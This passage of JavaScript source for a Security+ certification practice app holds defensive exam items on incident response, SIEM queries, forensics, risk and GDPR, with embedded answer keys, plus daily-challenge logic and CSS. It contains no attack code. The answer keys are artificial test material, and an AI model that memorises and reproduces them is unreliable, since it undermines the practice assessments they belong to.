        "svc_monitoring: SPN registered, member of Monitoring_ReadOnly group only",
        "svc_backup: no SPN, uses certificate-based authentication"
      ],
      "correct": 0
    },
    {
      "id": "p088",
      "ch": "4",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "easy",
      "cat": "Incident Response",
      "title": "Complete the business continuity and disaster recovery terminology",
      "scenario": "",
      "question": "Fill in the correct BCP/DR term for each description.",
      "explanation": "RPO (Recovery Point Objective): data loss tolerance — if RPO is 1 hour, backups must run at least hourly. Hot site: fully operational with real-time data replication — failover in minutes. Warm site: hardware ready, data partially current — hours to recover. Cold site: facility only, no equipment — days/weeks. Tabletop exercise: cheapest, most common — identifies gaps in plans without operational disruption. Other exercise types: walkthrough (review plans), simulation (functional test of some systems), full-scale exercise (complete test with all teams and systems activated). Regular exercises are required by frameworks like ISO 22301 and NIST SP 800-34.",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "The ___ defines the maximum acceptable data loss measured in time — it determines the minimum backup frequency required.",
          "answer": "RPO",
          "hint": "RTO, RPO, MTD, MTTR"
        },
        {
          "id": "b1",
          "sentence": "A ___ site has pre-installed, pre-configured hardware and software with current data replicated continuously — the fastest failover option, measured in minutes, but most expensive.",
          "answer": "hot site",
          "hint": "warm site, cold site, hot site, cloud site"
        },
        {
          "id": "b2",
          "sentence": "A ___ exercise is a discussion-based simulation where the IR team talks through their response to a hypothetical scenario — no actual systems are involved.",
          "answer": "tabletop",
          "hint": "simulation, tabletop, functional, full-scale"
        }
      ]
    },
    {
      "id": "p089",
      "ch": "4",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "hard",
      "cat": "Security Monitoring",
      "title": "Write a Splunk SPL query to detect brute force attempts",
      "scenario": "A SOC analyst needs to write a Splunk query to detect brute force attacks: more than 5 failed logins from a single source IP within 5 minutes.",
      "question": "Select the correct Splunk SPL query to detect this pattern.",
      "explanation": "Key Splunk SPL components: index=windows_security EventCode=4625: search in the correct index for the specific Windows event (failed auth). bucket _time span=5m: groups events into 5-minute time windows. stats count by src_ip, _time: counts events per source IP within each time bucket. where count > 5: applies the threshold filter. This pattern — bucket → stats → where — is the standard SPL approach for threshold-based detection. For production: add | eval threshold=5 and consider whitelisting known vulnerability scanner IPs to reduce false positives.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "index=windows_security EventCode=4625\n# 4625 = Failed Authentication on Windows\n# Fields available: src_ip, user, EventCode, _time\n# Goal: Alert when single IP has >5 failures in 5 minutes\n\n[SPL QUERY RUNNING]\nindex=windows_security EventCode=4625\n| bucket _time span=5m\n| stats count by src_ip, _time\n| where count > 5\n\n[RESULTS]\nsrc_ip           _time                count\n198.51.100.4    2024-04-01 02:14:00  47  ← ALERT\n203.0.113.88    2024-04-01 02:15:00  23  ← ALERT\n10.0.0.55       2024-04-01 03:00:00   3  (below threshold)\n\n[ENHANCEMENT] Add | sort -count | rename src_ip AS \"Attacking IP\"",
      "choices": [
        "index=windows_security EventCode=4625 | bucket _time span=5m | stats count by src_ip, _time | where count > 5",
        "index=windows_security | search EventCode=4625 | head 100",
        "index=windows_security EventCode=4624 | stats count by src_ip",
        "index=windows_security EventCode=4625 | table src_ip, user, _time"
      ],
      "correct": 0
    },
    {
      "id": "p090",
      "ch": "4",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "medium",
      "cat": "Digital Forensics",
      "title": "Order the digital forensic investigation steps for a seized device",
      "scenario": "",
      "question": "A forensic investigator receives a seized laptop from law enforcement. Order the correct forensic processing steps.",
      "explanation": "Forensic processing order: (1) Document receipt — photograph, record serial number, begin chain of custody. (2) Write-blocked imaging — hardware write blocker prevents any modification to the original; create forensic image. (3) Hash the image — MD5 + SHA-256 recorded in CoC proves integrity. (4) Analyse the IMAGE only — never work on the original evidence. (5) Report — document methodology, tools, findings, and conclusions. Never skip the write blocker — even reading a drive can modify last-accessed timestamps on some file systems. Never work on original evidence — analysis creates artefacts that contaminate the evidence.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Document findings in a detailed forensic report suitable for court submission"
        },
        {
          "id": "o1",
          "label": "Hash the forensic image (MD5 + SHA-256) and record in chain of custody documentation"
        },
        {
          "id": "o2",
          "label": "Connect the device via a hardware write blocker and create a forensic bit-for-bit image"
        },
        {
          "id": "o3",
          "label": "Analyse the forensic image on a separate forensic workstation — never the original"
        },
        {
          "id": "o4",
          "label": "Photograph the device, document serial number, and record receipt in chain of custody"
        }
      ],
      "correctOrder": [
        "o4",
        "o2",
        "o1",
        "o3",
        "o0"
      ]
    },
    {
      "id": "p091",
      "ch": "4",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "hard",
      "cat": "Identity Management",
      "title": "Analyse a PAM audit log for credential abuse",
      "scenario": "",
      "question": "Which log entries provide the STRONGEST evidence of credential misuse during admin-sarah's session?",
      "explanation": "PAM provides visibility into privileged session activity. The red flags in admin-sarah's session: (1) 4 database servers accessed — stated scope was one server. (2) Full table queries with no LIMIT — \"performance review\" does not require reading all customer payment and PII records. (3) 12.4GB export to /tmp — exporting a full payment table to a temp directory is data exfiltration staging, not performance analysis. This is a case for PAM session recording review, immediate credential revocation, and insider threat investigation. Read-only SQL can absolutely cause harm through data exfiltration.",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "PAM System Audit Log — 2024-04-01\n==================================\n08:14:22 admin-john  Checked out: svc_oracle_prod  Duration: 4h  Reason: scheduled maintenance\n08:14:24 svc_oracle_prod  Login to: DB-PROD-01\n08:18:55 svc_oracle_prod  SQL: SELECT * FROM customer_payments LIMIT 10  [OK]\n...\n08:45:00 admin-john  Checked in: svc_oracle_prod  Session ended\n\n11:32:17 admin-sarah  Checked out: svc_oracle_prod  Duration: 2h  Reason: query performance review\n11:32:19 svc_oracle_prod  Login to: DB-PROD-01\n11:32:21 svc_oracle_prod  Login to: DB-PROD-02\n11:32:23 svc_oracle_prod  Login to: DB-PROD-03\n11:32:25 svc_oracle_prod  Login to: DB-PROD-04\n11:33:01 svc_oracle_prod  SQL: SELECT * FROM customer_payments  [No LIMIT — full table]\n11:33:48 svc_oracle_prod  SQL: SELECT * FROM customer_pii  [No LIMIT]\n11:34:12 svc_oracle_prod  EXPORT: customer_payments → /tmp/export.csv  12.4GB\n11:34:55 admin-sarah  UNUSUAL: Credential held beyond scope (accessed 4 systems vs 1 expected)",
      "choices": [
        "admin-sarah checked out the credential with a legitimate reason — this is normal PAM behaviour",
        "Logging into 4 database servers (02, 03, 04 were not in the stated scope), querying two full PII tables with no LIMIT clause, and exporting 12.4GB of customer data to /tmp — vastly exceeds stated scope of \"query performance review\"",
        "The session lasted less than 2 hours so it is within approved parameters",
        "The SQL queries were SELECT statements — read-only access cannot cause harm"
      ],
      "correct": 1
    },
    {
      "id": "p092",
      "ch": "4",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "easy",
      "cat": "Vulnerability Management",
      "title": "Identify the correct vulnerability scan type for each scenario",
      "scenario": "A security team plans four different vulnerability scanning activities. Identify which scan type is INCORRECTLY matched to its scenario.",
      "question": "Which scan type is INCORRECTLY matched to its scenario?",
      "explanation": "PCI DSS Requirement 11.3 requires credentialed internal scans — not unauthenticated scans. An unauthenticated internal scan misses the majority of vulnerabilities because it cannot authenticate to systems to check patch levels, installed software versions, and configuration settings. PCI DSS also requires that internal scans be performed by qualified internal resources or qualified third parties, and that critical/high vulnerabilities be remediated before a scan can be considered passing. Additionally, PCI DSS requires external scans by an Approved Scanning Vendor (ASV) — a separate requirement from internal scans.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. External attack surface scan → Unauthenticated scan from outside the network - Correct — unauthenticated external scanning simulates an attacker's perspective, showing only what is exposed from the internet without credentials.\n2. Internal compliance check → Credentialed scan with domain admin credentials - Correct — credentialed scans authenticate to systems and enumerate installed software, patches, and configuration from the inside for accurate compliance checking.\n3. Annual PCI DSS scan → Internal unauthenticated scan run by internal IT team - The team says this satisfies PCI DSS Requirement 11.3 for internal vulnerability scanning.\n4. Web application testing → DAST tool scanning the running application - Correct — DAST tools probe the running web application from the outside, testing input validation, authentication, and application logic.",
      "choices": [
        "External attack surface scan → Unauthenticated scan from outside the network",
        "Internal compliance check → Credentialed scan with domain admin credentials",
        "Annual PCI DSS scan → Internal unauthenticated scan run by internal IT team",
        "Web application testing → DAST tool scanning the running application"
      ],
      "correct": 2
    },
    {
      "id": "p093",
      "ch": "4",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "hard",
      "cat": "Incident Response",
      "title": "Match incident types to their containment strategies",
      "scenario": "",
      "question": "Match each incident type to the MOST appropriate immediate containment strategy.",
      "explanation": "Containment is always tailored to the incident type: Ransomware: speed is critical — every connected system risks encryption. Network isolation stops spread. Phishing: email-layer containment removes the lure from all inboxes simultaneously. Insider/data theft: contain the exfil channel (block destinations) + contain the actor (disable account). Preserve evidence before account wipe. DDoS: upstream mitigation is the only effective response — the attack volume exceeds what you can handle locally. Compromised privileged account: disable immediately to stop all further abuse — then investigate scope before re-enabling.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Active ransomware spreading across the network"
        },
        {
          "id": "i1",
          "label": "Phishing campaign targeting employees with credential theft links"
        },
        {
          "id": "i2",
          "label": "Insider threat exfiltrating data via personal cloud storage"
        },
        {
          "id": "i3",
          "label": "DDoS attack saturating internet uplink"
        },
        {
          "id": "i4",
          "label": "Compromised service account with domain admin privileges"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Network isolate all infected systems immediately via EDR; disable affected shares and network paths"
        },
        {
          "id": "t1",
          "label": "Block malicious URLs at email gateway; quarantine emails containing the links from all mailboxes"
        },
        {
          "id": "t2",
          "label": "Block personal cloud storage domains at the proxy/firewall; disable the user's account pending investigation"
        },
        {
          "id": "t3",
          "label": "Contact ISP/upstream provider for BGP blackholing; engage DDoS mitigation service; activate rate limiting"
        },
        {
          "id": "t4",
          "label": "Immediately disable the service account in Active Directory; reset the password; review all activity in audit logs"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p094",
      "ch": "4",
      "type": "CONFIG/ACL",
      "emoji": "⚙️",
      "difficulty": "medium",
      "cat": "Security Monitoring",
      "title": "Evaluate SIEM alert tuning decisions",
      "scenario": "A SOC analyst tunes a SIEM to reduce false positives on an alert: \"Multiple failed logins followed by success (possible credential attack)\".",
      "question": "Exclude authorised vulnerability scanner — reduces FP?",
      "explanation": "Good tuning: actions 1, 2, 4 reduce false positives while maintaining detection. Excluding documented authorised activity (scanners, service accounts) and adding context (time of day) narrows the alert to genuinely suspicious activity. Bad tuning: Action 3 (threshold 1000) — most real brute force attacks succeed in fewer than 100 attempts; raising to 1000 creates a massive blind spot. Action 5 (disable rule) — eliminates all detection of a real attack technique; never the right answer. The correct approach is to understand WHY the false positives occur and address that root cause.",
      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
      "currentConfig": "Tuning Action | Approach | Expected Effect | Good Tuning?\n1. Exclude known scanner IPs | Whitelist Nessus scanner (10.0.0.5) from triggering the alert | FP reduction | ?\n2. Exclude service accounts | Whitelist svc_* accounts that legitimately retry frequently | FP reduction | ?\n3. Raise threshold to 1000 | Only alert after 1000 failed logins before success | FP reduction | ?\n4. Add business hours context | Weight alerts more heavily for off-hours (23:00-06:00) failures | FP reduction | ?\n5. Disable the rule entirely | Remove the alert because it generates too many FPs | FP reduction | ?",
      "choices": [
        "GOOD",
        "BAD"
      ],
      "correct": 0
    },
    {
      "id": "p095",
      "ch": "5",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "easy",
      "cat": "Governance & Compliance",
      "title": "Match compliance frameworks to their primary data type or industry",
      "scenario": "",
      "question": "Match each compliance framework or regulation to the data type or industry it PRIMARILY governs.",
      "explanation": "Knowing which framework applies: HIPAA: US healthcare. PCI DSS: payment card — applies globally to any merchant or service provider handling card data. GDPR: EU personal data — applies to organisations worldwide if they process EU residents' data (extraterritorial reach). SOX: US public companies — Section 404 requires management and auditor attestation of internal controls (IT controls heavily scrutinised). FERPA: US students. Multiple frameworks often apply simultaneously — a US hospital accepting credit card payments from EU patients must comply with HIPAA + PCI DSS + GDPR.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "HIPAA (US)"
        },
        {
          "id": "i1",
          "label": "PCI DSS"
        },
        {
          "id": "i2",
          "label": "GDPR (EU)"
        },
        {
          "id": "i3",
          "label": "SOX (US)"
        },
        {
          "id": "i4",
          "label": "FERPA (US)"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Protected Health Information (PHI) — medical records, diagnoses, treatment data for US healthcare"
        },
        {
          "id": "t1",
          "label": "Payment card data — credit/debit card numbers and transaction data, any industry that stores/processes/transmits CHD"
        },
        {
          "id": "t2",
          "label": "Personal data of EU/EEA residents — any industry, any location if processing EU resident data"
        },
        {
          "id": "t3",
          "label": "Financial reporting controls for US publicly traded companies — IT controls over financial systems"
        },
        {
          "id": "t4",
          "label": "Student educational records — US educational institutions receiving federal funding"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p096",
      "ch": "5",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "medium",
      "cat": "Risk Management",
      "title": "Order the risk management process correctly",
      "scenario": "",
      "question": "Order the risk management lifecycle steps from FIRST to LAST.",
      "explanation": "Risk management lifecycle (NIST SP 800-39 / ISO 27005): (1) Identify risks — what assets, what threats, what vulnerabilities. (2) Analyse risk level — likelihood × impact = risk rating. (3) Select treatment — mitigate, accept, transfer, avoid based on risk tolerance. (4) Implement controls — deploy the chosen treatment. (5) Monitor continuously — risks change, controls degrade, new threats emerge. The cycle repeats. This is not a one-time project — effective risk management is continuous.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Continuously monitor risks, control effectiveness, and changes in the threat landscape"
        },
        {
          "id": "o1",
          "label": "Implement selected controls to treat identified risks"
        },
        {
          "id": "o2",
          "label": "Identify assets, threats to those assets, and existing vulnerabilities"
        },
        {
          "id": "o3",
          "label": "Select the appropriate risk treatment strategy (mitigate, accept, transfer, avoid)"
        },
        {
          "id": "o4",
          "label": "Analyse and quantify the level of risk using likelihood × impact or qualitative rating"
        }
      ],
      "correctOrder": [
        "o2",
        "o4",
        "o3",
        "o1",
        "o0"
      ]
    },
    {
      "id": "p097",
      "ch": "5",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "hard",
      "cat": "Frameworks",
      "title": "Select the correct security framework for a specific use case",
      "scenario": "An organisation in each scenario needs to select a security framework. Identify the MISMATCHED recommendation.",
      "question": "Which framework recommendation is INCORRECTLY matched to the organisation's needs?",
      "explanation": "ISO 27001 is NOT the correct primary framework for OT/ICS/SCADA environments. ISO 27001 was designed for information technology — it assumes IT concepts (confidentiality, integrity, availability in that order) that don't map well to operational technology where safety and availability are the primary concerns. The correct frameworks for industrial environments: IEC 62443 (primary OT/ICS security standard), NIST SP 800-82 (Guide to ICS Security), and NERC CIP (for electric grid). ISO 27001 can complement these but should not be the primary OT security framework.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. US Federal agency implementing FISMA compliance → NIST RMF (SP 800-37) and NIST SP 800-53 - Correct — NIST RMF is the mandatory framework for US federal agencies under FISMA. SP 800-53 provides the control catalogue.\n2. E-commerce company wanting to demonstrate security to enterprise customers → SOC 2 Type II audit - Correct — SOC 2 Type II is the industry standard for SaaS/cloud providers demonstrating security controls effectiveness over time (typically 6-12 months of operation).\n3. Industrial water treatment facility → ISO 27001 certification as their primary OT security framework - The CISO recommends ISO 27001 because it is internationally recognised and covers all aspects of information security.\n4. Organisation wanting voluntary cybersecurity risk management → NIST Cybersecurity Framework (CSF) - Correct — NIST CSF is explicitly designed as a voluntary, risk-based framework usable by any organisation regardless of size or sector.",
      "choices": [
        "US Federal agency implementing FISMA compliance → NIST RMF (SP 800-37) and NIST SP 800-53",
        "E-commerce company wanting to demonstrate security to enterprise customers → SOC 2 Type II audit",
        "Industrial water treatment facility → ISO 27001 certification as their primary OT security framework",
        "Organisation wanting voluntary cybersecurity risk management → NIST Cybersecurity Framework (CSF)"
      ],
      "correct": 2
    },
    {
      "id": "p098",
      "ch": "5",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "medium",
      "cat": "Data Privacy",
      "title": "Complete the data privacy rights and obligations",
      "scenario": "",
      "question": "Fill in the correct GDPR term for each description.",
      "explanation": "DPIA: mandatory before processing if \"high risk\" — organisations must complete this before deploying facial recognition, large-scale health monitoring, or systematic profiling. Consult the DPA if residual risk is unacceptable. Right to Erasure (\"Right to be Forgotten\"): Article 17 — not absolute; exceptions exist for legal obligations, public interest, archiving, and freedom of expression. DPA (Data Processing Agreement): legally required between controller and processor. Cloud providers (AWS, Microsoft, Google) must sign DPAs with customers. Without a DPA, using a cloud provider for EU personal data is a GDPR violation.",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "The ___ is a legal requirement under GDPR Article 35 for processing operations that are \"likely to result in a high risk\" — including large-scale processing of special category data or systematic monitoring.",
          "answer": "Data Protection Impact Assessment (DPIA)",
          "hint": "Privacy by Design review, Data Protection Impact Assessment (DPIA), Data Processing Agreement, Legitimate Interest Assessment"
        },
        {
          "id": "b1",
          "sentence": "Under GDPR Article 17, the ___ allows individuals to request deletion of their personal data when it is no longer necessary for the original purpose or consent is withdrawn.",
          "answer": "Right to Erasure",
          "hint": "Right to Portability, Right to Erasure, Right of Access, Right to Rectification"
        },
        {
          "id": "b2",
          "sentence": "A ___ is a contract required by GDPR Article 28 between a controller and processor, specifying the subject matter, duration, nature, and purpose of processing, and the processor's obligations.",
          "answer": "Data Processing Agreement",
          "hint": "Service Level Agreement, Non-Disclosure Agreement, Data Processing Agreement, Joint Controller Agreement"
        }
      ]
    },
    {
      "id": "p099",
      "ch": "5",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "easy",
      "cat": "Security Awareness",
      "title": "Order the steps to respond to a reported phishing email",
      "scenario": "",
      "question": "An employee forwards a suspicious email to security@company.com. Order the security team's response steps CORRECTLY.",
      "explanation": "Phishing response order: (1) Analyse safely — understand what the email does before taking action (is it malware, credential theft, or a false positive?). (2) Quarantine — remove from all inboxes to prevent further clicks. (3) Block the domain — prevent anyone from reaching it if they click cached emails. (4) Check for victims — proxy and SIEM logs reveal who clicked and whether credentials were entered. (5) Company-wide alert — inform employees after you have complete information (not before — premature alerts can cause panic or tip off an insider). Reset credentials for any confirmed victims before step 5.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Quarantine the email from all recipient mailboxes using the email security platform"
        },
        {
          "id": "o1",
          "label": "Analyse the email headers, links, and attachments in a safe sandbox environment"
        },
        {
          "id": "o2",
          "label": "Send a company-wide alert warning other employees about the phishing campaign"
        },
        {
          "id": "o3",
          "label": "Check if any recipients clicked links or entered credentials using proxy and SIEM logs"
        },
        {
          "id": "o4",
          "label": "Block the malicious domain at the email gateway and web proxy"
        }
      ],
      "correctOrder": [
        "o1",
        "o0",
        "o4",
        "o3",
        "o2"
      ]
    },
    {
      "id": "p100",
      "ch": "5",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "hard",
      "cat": "Risk Management",
      "title": "Evaluate a risk register and select the correct risk response",
      "scenario": "",
      "question": "Which risk treatment decision is the MOST appropriate based on the risk register information?",
      "explanation": "Option A (remediate) is the most appropriate because: (1) The cost-benefit is overwhelming — £12,000 fix vs £500K+ regulatory fines + breach costs + reputational damage. (2) The residual risk after current controls is still HIGH — the WAF provides incomplete protection (WAF rules can be bypassed). (3) PCI DSS Requirement 6.3.2 mandates secure coding practices — accepting this risk may itself be a compliance violation. Option B: accepting a HIGH residual risk on a revenue-generating payment system with a cheap fix available is difficult to justify to a board. Option C: insurance doesn't fix the vulnerability. Option D: transferring to a processor is a valid long-term option but not faster than a 2-week code fix.",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "RISK REGISTER — Information Security\n======================================\nRISK ID: ISR-047\nAsset: Customer-facing payment portal (revenue: £8.4M/year)\nThreat: SQL injection exploitation via search function\nVulnerability: Unsanitised input in product search endpoint\nLikelihood: HIGH (public PoC exploit exists for this endpoint type)\nImpact: CRITICAL (full database access, PAN exposure, PCI DSS fines up to £500K)\nCurrent Controls: WAF (basic rules), HTTPS, authentication required\nInherent Risk Rating: CRITICAL\nResidual Risk (with current controls): HIGH\n\nProposed treatments:\nA) Remediate via code fix (parameterised queries): Cost £12,000, timeline 2 weeks\nB) Accept residual risk — WAF provides sufficient protection\nC) Purchase additional cyber insurance to cover potential breach costs\nD) Transfer to third-party payment processor (eliminate cardholder data from environment)",
      "choices": [
        "Option A: Remediate via code fix — £12,000 is substantially less than the £500K+ regulatory fine exposure, and the residual risk is HIGH despite current controls",
        "Option B: Accept residual risk — the WAF is already a compensating control and acceptance is a valid risk management strategy",
        "Option C: Purchase additional cyber insurance — transfers the financial risk",
        "Option D: Transfer to third-party processor — eliminates the risk entirely by removing cardholder data from the environment"
      ],
      "correct": 0
    }
];

// ═══════════════════════════════════════════════════════════════
// DAILY CHALLENGE DATA
// ═══════════════════════════════════════════════════════════════
const DAILY_CHALLENGES = [
  { date:"default", type:"mcq5",
    title:"5-Question Daily Challenge",
    description:"Test your Security+ knowledge with today's five questions.",
    qids:["m001","m009","m014","m022","m028"] },
  { date:"mon", type:"pbq", qid:"p002", title:"Daily PBQ: File Integrity Check",
    description:"Verify a downloaded file's integrity using a hash command." },
  { date:"tue", type:"pbq", qid:"p006", title:"Daily PBQ: Threat Actor Matching",
    description:"Can you match every threat actor to their motivation?" },
  { date:"wed", type:"mcq5", title:"Wednesday Challenge",
    description:"Five questions focused on Cryptography and PKI.",
    qids:["m004","m005","m007","m008","m019"] },
  { date:"thu", type:"pbq", qid:"p007", title:"Daily PBQ: Alert Triage",
    description:"Which alert needs immediate action? Practice incident prioritisation." },
  { date:"fri", type:"mcq5", title:"Friday Review",
    description:"Mixed questions across all five domains.",
    qids:["m002","m011","m017","m024","m029"] },
  { date:"sat", type:"pbq", qid:"p012", title:"Weekend PBQ: Social Engineering",
    description:"Fill in the social engineering attack types from context clues." },
  { date:"sun", type:"mcq5", title:"Sunday Practice",
    description:"Governance, risk, and compliance focus.",
    qids:["m028","m029","m030","m031","m032"] },
];

function getTodayChallenge() {
  const days=["sun","mon","tue","wed","thu","fri","sat"];
  const day=days[new Date().getDay()];
  return DAILY_CHALLENGES.find(c=>c.date===day)||DAILY_CHALLENGES[0];
}

function getNextRelatedPBQ(current, attempts=[]) {
  if(!current) return null;
  const correctIds=new Set(attempts.filter(a=>a.pbq&&a.correct).map(a=>a.qid));
  const candidates=PBQ_BANK.filter(q=>q.id!==current.id&&q.ch===current.ch&&q.type===current.type&&!correctIds.has(q.id));
  if(candidates.length) return candidates[0];
  const sameChapter=PBQ_BANK.filter(q=>q.id!==current.id&&q.ch===current.ch&&!correctIds.has(q.id));
  if(sameChapter.length) return sameChapter[0];
  const index=PBQ_BANK.findIndex(q=>q.id===current.id);
  return PBQ_BANK[(index+1)%PBQ_BANK.length]||null;
}

// ═══════════════════════════════════════════════════════════════
// CSS — Clean light/dark design
// ═══════════════════════════════════════════════════════════════
const makeCSS = (t) => `
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&family=Sora:wght@600;700;800&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
html{background:${t.bg};}
body{background:
radial-gradient(circle at top left, ${t.accent}18, transparent 34rem),
radial-gradient(circle at 85% 12%, ${t.green}10, transparent 26rem),
linear-gradient(180deg, ${t.bg}, ${t.bg});color:${t.text};font-family:'Manrope',system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;font-size:15px;line-height:1.6;letter-spacing:0;transition:background .3s,color .3s;}
h1,h2,h3{font-family:'Sora','Manrope',system-ui,sans-serif;font-weight:800;letter-spacing:0;}
button,input,select{font:inherit;}
button:focus-visible,input:focus-visible,select:focus-visible,.nav-lnk:focus-visible,.opt:focus-visible{outline:3px solid ${t.accent}38;outline-offset:2px;}
::-webkit-scrollbar{width:5px;}
::-webkit-scrollbar-track{background:${t.bg};}
::-webkit-scrollbar-thumb{background:${t.border};border-radius:3px;}
.card{background:linear-gradient(180deg, ${t.surface}, ${t.surface}f2);border:1px solid ${t.border};border-radius:8px;box-shadow:0 14px 36px rgba(7,12,24,.10);}
.card-hover{transition:border-color .2s,box-shadow .2s,transform .2s,background .2s;}
.card-hover:hover{border-color:${t.accent};box-shadow:0 16px 36px ${t.accent}16;transform:translateY(-1px);background:linear-gradient(180deg, ${t.surface}, ${t.accent}08);}
.label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.04em;color:${t.textDim};}
.mono{font-family:'JetBrains Mono',monospace;}
.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:99px;font-size:11px;font-weight:600;}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;min-height:38px;padding:9px 16px;border-radius:8px;border:none;font-size:14px;font-weight:700;cursor:pointer;transition:all .18s;font-family:'Manrope',sans-serif;white-space:nowrap;}
.btn-primary{background:${t.accent};color:#fff;}
.btn-primary:hover{background:${t.accentHover};box-shadow:0 10px 22px ${t.accent}35;}
.btn:disabled,.btn-primary:disabled{opacity:.45;cursor:not-allowed;box-shadow:none;transform:none;}
.btn-outline{background:transparent;color:${t.accent};border:1.5px solid ${t.accent};}
.btn-outline:hover{background:${t.accent}12;}
.btn-ghost{background:transparent;color:${t.textSec};border:1px solid ${t.border};}
.btn-ghost:hover{color:${t.text};background:${t.panel};}
.btn-danger{background:transparent;color:${t.red};border:1px solid ${t.red}44;}
.btn-danger:hover{background:${t.red}12;}
.btn:active{transform:scale(.97);}
.input{width:100%;background:${t.inputBg};border:1.5px solid ${t.border};border-radius:8px;padding:11px 14px;font-size:14px;color:${t.text};font-family:'Manrope',sans-serif;outline:none;transition:border-color .2s,box-shadow .2s;}
.input:focus{border-color:${t.accent};box-shadow:0 0 0 3px ${t.accent}20;}
.input::placeholder{color:${t.textDim};}
.tab{padding:9px 18px;cursor:pointer;border-bottom:2px solid transparent;font-size:13px;font-weight:500;color:${t.textSec};transition:all .15s;white-space:nowrap;}
.tab:hover{color:${t.text};}
.tab.act{color:${t.accent};border-bottom-color:${t.accent};}
.nav-lnk{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;font-size:13px;font-weight:800;color:${t.textSec};cursor:pointer;transition:all .15s;border:1px solid transparent;}
.nav-lnk:hover{color:${t.text};background:${t.panel};box-shadow:inset 0 0 0 1px ${t.border};}
.nav-lnk.act{color:${t.text};background:linear-gradient(135deg, ${t.accent}1f, ${t.green}10);border-color:${t.accent}28;box-shadow:0 10px 22px ${t.accent}10;}
.nav-glyph{width:22px;height:22px;border-radius:7px;display:inline-flex;align-items:center;justify-content:center;position:relative;flex-shrink:0;background:${t.panel};border:1px solid ${t.border};transition:transform .2s,background .2s,border-color .2s,box-shadow .2s;}
.nav-glyph span,.nav-glyph::before,.nav-glyph::after{content:"";position:absolute;display:block;transition:all .25s ease;}
.nav-glyph-dashboard span{width:10px;height:8px;border:2px solid currentColor;border-top:0;bottom:5px;border-radius:1px;}
.nav-glyph-dashboard::before{width:12px;height:12px;border-left:2px solid currentColor;border-top:2px solid currentColor;transform:rotate(45deg);top:3px;}
.nav-lnk:hover .nav-glyph-dashboard,.nav-glyph-dashboard.active{color:#f59e0b;background:#f59e0b18;border-color:#f59e0b55;box-shadow:0 0 18px #f59e0b40;}
.nav-lnk:hover .nav-glyph-dashboard::before,.nav-glyph-dashboard.active::before{animation:roofDrop .55s ease both;}
.nav-glyph-mcq span{width:11px;height:14px;border:2px solid currentColor;border-radius:2px;}
.nav-glyph-mcq::before{width:6px;height:2px;background:currentColor;top:8px;}
.nav-glyph-mcq::after{width:6px;height:2px;background:currentColor;top:13px;}
.nav-lnk:hover .nav-glyph-mcq,.nav-glyph-mcq.active{color:#3b82f6;background:#3b82f618;border-color:#3b82f655;box-shadow:0 0 18px #3b82f640;}
.nav-lnk:hover .nav-glyph-mcq span,.nav-glyph-mcq.active span{animation:paperLift .58s ease both;}
.nav-lnk:hover .nav-glyph-mcq::before,.nav-glyph-mcq.active::before{animation:lineCheck .58s ease both;}
.nav-lnk:hover .nav-glyph-mcq::after,.nav-glyph-mcq.active::after{animation:lineCheck .58s ease .08s both;}
.nav-glyph-pbq span{width:9px;height:11px;border-radius:50% 50% 46% 46%;border:2px solid currentColor;top:3px;}
.nav-glyph-pbq::before{width:8px;height:2px;background:currentColor;bottom:5px;border-radius:4px;}
.nav-glyph-pbq::after{width:5px;height:2px;background:currentColor;bottom:2px;border-radius:4px;}
.nav-glyph-pbq.active{color:#f59e0b;background:#f59e0b18;border-color:#f59e0b55;box-shadow:0 0 18px #f59e0b45;}
.nav-glyph-pbq.active span{background:#f59e0b22;animation:bulbPulse 1.2s ease infinite alternate;}
.nav-glyph-daily span{width:14px;height:14px;border:2px solid currentColor;border-radius:50%;}
.nav-glyph-daily::before{width:5px;height:5px;background:currentColor;border-radius:50%;}
